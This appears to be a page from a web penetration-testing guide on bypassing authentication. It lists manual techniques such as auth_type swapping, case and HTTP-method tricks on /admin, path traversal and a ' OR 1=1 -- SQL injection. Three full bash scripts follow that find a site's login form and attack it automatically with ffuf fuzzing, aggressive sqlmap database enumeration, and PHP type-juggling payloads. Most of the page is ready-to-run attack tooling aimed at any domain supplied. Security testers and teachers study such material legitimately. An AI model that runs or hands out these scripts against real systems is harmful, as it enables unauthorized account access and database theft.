# Bypassing Authentication Schema

## Check List

* [ ] Ensure that authentication is applied across all services that require it.

## Methodology

### Black Box

#### Auth Type Manipulation

{% stepper %}
{% step %}
Log in to the target site, go to the authentication page, and check if it uses multiple types of authentication, such as password, email, Google, and Facebook
{% endstep %}

{% step %}
Enter the request using an incorrect password and email address. Intercept the POST request using Bupr Suite
{% endstep %}

{% step %}
Then examine the intercepted request and see if you see a parameter called `auth_type`
{% endstep %}

{% step %}
If you see such a parameter that specifies the type of authentication with Google or Facebook or password and email, send the request to the repeater
{% endstep %}

{% step %}
And then change the authentication type in the `auth_type` parameter to facebook

```json
"auth_type": "email" → "facebook"
```
{% endstep %}

{% step %}
If the user information is displayed in the server response, the authentication bypass is confirmed
{% endstep %}
{% endstepper %}

***

#### Email Domain Validation Bypass

{% stepper %}
{% step %}
Access registration form
{% endstep %}

{% step %}
Enter email `test@redacted.com`, Capture `POST` request in Burp
{% endstep %}

{% step %}
Notice server prepends or validates only suffix (`@redacted.com`)

```http
email=bishal@redacted.com
```
{% endstep %}

{% step %}
Modify email domain to any external domain

```
email=bishal0x01@bugcrowdninja.com
```
{% endstep %}

{% step %}
Send request
{% endstep %}

{% step %}
Receive verification email at `bishal0x01@bugcrowdninja.com`
{% endstep %}

{% step %}
Click link, Account activated
{% endstep %}
{% endstepper %}

***

#### Change The Letter Case

{% stepper %}
{% step %}
Use the [enumerate Application](https://unk9vvn.gitbook.io/penetration-testing/web/reconnaissance/enumerate-applications) command to perform the identification process and obtain the sensitive paths of the admin panel
{% endstep %}

{% step %}
Access known admin path

```http
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
If it gives you a 403 error with a 401 in response, then send the following request

```http
GET /AdMiN HTTP/1.1
GET /ADMIN HTTP/1.1
GET /aDmIn HTTP/1.1
GET /Admin HTTP/1.1
GET /aDMIN HTTP/1.1
```
{% endstep %}

{% step %}
If any variation returns 200 OK, Case sensitivity bypass confirmed
{% endstep %}
{% endstepper %}

***

#### HTTP Method Bypass Auth

{% stepper %}
{% step %}
Make a request to the admin panel and check if it gives you a 403 in response
{% endstep %}

{% step %}
If it gives you a 403 error with a 401 then change the HTTP method to PUT or Patch or ...

```http
PATCH /admin HTTP/1.1
HEAD /admin HTTP/1.1
PUT /admin HTTP/.1.1
```
{% endstep %}
{% endstepper %}

***

#### Path Confusion Auth Bypass

{% stepper %}
{% step %}
Request a sensitive route like the panel or admin route and if it gives you a 403, try to mislead the route using the payload below

```http
GET /%2e%2e/admin HTTP/1.1
```
{% endstep %}

{% step %}
If the server response shows login or admin information, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### [Fullname Parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection)

{% stepper %}
{% step %}
Navigate to the SignUp page of the target website, typically located at a URL like `/signup` or `/register` Open https://example.com/signup in the browser
{% endstep %}

{% step %}
Identify the “Full Name” input field in the SignUp form, which is prone to processing user input directly into database queries Find the text box labeled “Full Name” in the form
{% endstep %}

{% step %}
Enter the payload `' OR 1=1 --` into the Full Name field to attempt bypassing the query’s conditions and access unauthorized data Input `John' OR 1=1 --` in the Full Name field
{% endstep %}

{% step %}
Click the `“Sign Up”` button to send the payload to the server via a <sub>POST</sub> request
{% endstep %}

{% step %}
Look for a generic error (“Invalid input”) or a `400`/`500` status code, indicating the payload was blocked, or unexpected success, suggesting a vulnerability
{% endstep %}

{% step %}
If a 400/500 error appears, modify the payload to `' OR 1=2 --` and submit again. Compare responses: if `' OR 1=1 --` allows form submission or data access (account creation without valid input) while `' OR 1=2 --` fails, it confirms SQL injection, as the true condition (`1=1`) altered the query’s logic
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet

### Parameter Modification <a href="#parameter-modification" id="parameter-modification"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano auth-bypass-params.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
DEPS="git seclists golang ffuf"

# Install Katana
if ! command -v katana &>/dev/null; then
    color_print GREEN "[*] Installing katana ..."
    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
fi

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)

if [ -z "$LOGIN" ]; then
    color_print RED "[!] No login page found. Exiting."
    exit 1
fi

HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA check
if echo "$HTML" | grep -qiE "g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"; then
    color_print RED "[!] CAPTCHA detected. Brute-force aborted."
    exit 1
fi

# Extract Form Action & Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
if [[ "$ACTION" == /* ]]; then
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    FULL_ACTION=$(dirname "$LOGIN")"/$ACTION"
fi

# Extract Username & Password Fields
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# CSRF Token Extraction
CSRF_FIELD=""
CSRF_VALUE=""
HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

# Prepare POST Data
DATA="${USERNAME_FIELD}=admin&${PASSWORD_FIELD}=admin12341234"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"

COOKIES=$(curl -s -I "$URL" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | cut -d';' -f1 | grep -i 'PHPSESSID')
HEADERS=(
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Auth Bypass Header
cat > /tmp/auth-bypass-params.txt << EOF
authenticated=yes
authenticated=true
authenticated=1
logged_in=yes
logged_in=true
logged_in=1
is_logged_in=yes
is_logged_in=true
is_logged_in=1
is_authenticated=yes
is_authenticated=true
is_authenticated=1
auth=yes
auth=true
auth=1
auth_user=yes
auth_user=true
auth_user=1
auth_user_id=yes
auth_user_id=true
auth_user_id=1
auth_role=yes
auth_role=true
auth_role=1
auth_role_id=yes
auth_role_id=true
auth_role_id=1
auth_role_name=yes
auth_role_name=true
auth_role_name=1
EOF

# Run FFUF
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL?FUZZ" \
         -w "/tmp/auth-bypass-params.txt:FUZZ" \
         -X GET \
         -ac -c -r -mc 200 \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION?FUZZ" \
         -w "/tmp/auth-bypass-params.txt:FUZZ" \
         -X POST -d "$DATA" \
         -ac -c -r -mc 200 \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x auth-bypass-params.sh;sudo ./auth-bypass-params.sh $WEBSITE
```

### Session ID Prediction <a href="#session-id-prediction" id="session-id-prediction"></a>



### SQL Injection (HTML Form Authentication) <a href="#sql-injection-html-form-authentication" id="sql-injection-html-form-authentication"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [SQLMap](https://github.com/sqlmapproject/sqlmap)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano auth-bypass-sqli.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
DEPS="git seclists golang ffuf sqlmap"

# Install Katana
if ! command -v katana &>/dev/null; then
    color_print GREEN "[*] Installing katana ..."
    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
fi

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)

if [ -z "$LOGIN" ]; then
    echo "[!] No login page found. Exiting."
    exit 1
fi

# Fetch HTML
HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA / reCAPTCHA Check
CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
    echo "[!] CAPTCHA detected on login page. Brute-force aborted."
    exit 1
fi

# Extract Form Action and Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract Username & Password Ffiles
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# CSRF Token Extration
CSRF_FIELD=""
CSRF_VALUE=""

HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
fi

# Prepre POST Data
DATA="${USERNAME_FIELD}=admin&${PASSWORD_FIELD}=admin12341234"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"

# Extract Cookies
COOKIES=$(curl -s -I "$URL" \
  | grep -i '^Set-Cookie:' \
  | sed -E 's/^Set-Cookie: //I' \
  | cut -d';' -f1 \
  | grep -i 'PHPSESSID')

# Extract only domain and port
HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')

# Headers
HEADERS=(
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

#  Convert Headers → sqlmap Format
SQLMAP_HEADERS=""
for h in "${HEADERS[@]}"; do
    CLEANED=$(echo "$h" | sed 's/^-H //')
    SQLMAP_HEADERS="${SQLMAP_HEADERS}${CLEANED}\n"
done

# Run SQLMAP
if [[ "$METHOD" == "get" ]]; then
    SQLMAP_URL="${FULL_ACTION}?${DATA}"
    sqlmap -u "$SQLMAP_URL" \
        --headers="$SQLMAP_HEADERS" \
        --cookie="$COOKIES" \
        --batch --level=5 --risk=3 -v 3 \
        --random-agent --threads=10 \
        --tamper=space2comment,randomcase \
        --not-string="invalid\|incorrect\|failed\|error\|denied" \
        --dbs --banner --current-user --current-db --is-dba

else
    sqlmap -u "$FULL_ACTION" \
        --data="$DATA" \
        --headers="$SQLMAP_HEADERS" \
        --cookie="$COOKIES" \
        --batch --level=5 --risk=3 -v 3 \
        --random-agent --threads=10 \
        --tamper=space2comment,randomcase \
        --not-string="invalid\|incorrect\|failed\|error\|denied" \
        --dbs --banner --current-user --current-db --is-dba
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x auth-bypass-sqli.sh;sudo ./auth-bypass-sqli.sh $WEBSITE
```

### PHP Loose Comparison <a href="#php-loose-comparison" id="php-loose-comparison"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano auth-bypass-tj.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
DEPS="git seclists golang ffuf"

# Install Katana
if ! command -v katana &>/dev/null; then
    color_print GREEN "[*] Installing katana ..."
    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
fi

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# Wordlist – Type Juggling Payloads
cat <<EOF > "/tmp/type-juggling.txt"
0
0e0
0e12345
0e215962017
0e11111111
0e1294123
null
NULL
true
false
"0"
"0e0"
"null"
[]
{}
EOF

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:' | head -n 1)

if [ -z "$LOGIN" ]; then
    echo "[!] No login page found. Exiting."
    exit 1
fi

# Fetch HTML
HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA / reCAPTCHA Check
CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
    echo "[!] CAPTCHA detected on login page. Brute-force aborted."
    exit 1
fi

# Extract Form Action and Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract Username & Password Ffiles
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

# CSRF Token Extration
CSRF_FIELD=""
CSRF_VALUE=""

HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
fi

# Prepre POST Data
DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
[ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"

# Extract Cookies
COOKIES=$(curl -s -I "$URL" \
  | grep -i '^Set-Cookie:' \
  | sed -E 's/^Set-Cookie: //I' \
  | cut -d';' -f1 \
  | grep -i 'PHPSESSID')

# Extract only domain and port
HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')

# Headers
HEADERS=(
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Language: en-US,fa-IR;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "Origin: $URL"
  -H "Sec-GPC: 1"
  -H "Connection: keep-alive"
  -H "Referer: $LOGIN"
  -H "Cookie: $COOKIES"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Priority: u=0, i"
)

# Run FFUF
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "/tmp/type-juggling.txt:FUZZ1" \
         -w "/tmp/type-juggling.txt:FUZZ2" \
         -X GET \
         -ac -c -r \
         -mc 200 \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "/tmp/type-juggling.txt:FUZZ1" \
         -w "/tmp/type-juggling.txt:FUZZ2" \
         -X POST \
         -d "$DATA" \
         -ac -c -r \
         -mc 200 \
         "${HEADERS[@]}"
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x auth-bypass-tj.sh;sudo ./auth-bypass-tj.sh $WEBSITE
```
